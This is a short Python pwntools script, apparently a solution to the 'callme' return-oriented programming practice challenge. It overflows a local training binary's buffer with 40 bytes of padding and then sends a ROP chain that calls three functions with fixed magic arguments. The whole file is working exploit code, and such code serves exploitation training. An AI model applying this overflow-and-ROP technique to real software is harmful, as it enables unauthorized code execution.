from pwn import *

r=process('./callme')
r.recvuntil('> ')
pop_rdi_rsi_rdx=0x000000000040093c
one=0x400720
two=0x400740
three=0x4006f0
rop = p64(pop_rdi_rsi_rdx)+p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
payload='a'*40
payload+=rop+p64(one)+rop+p64(two)+rop+p64(three)
r.sendline(payload)
r.interactive()
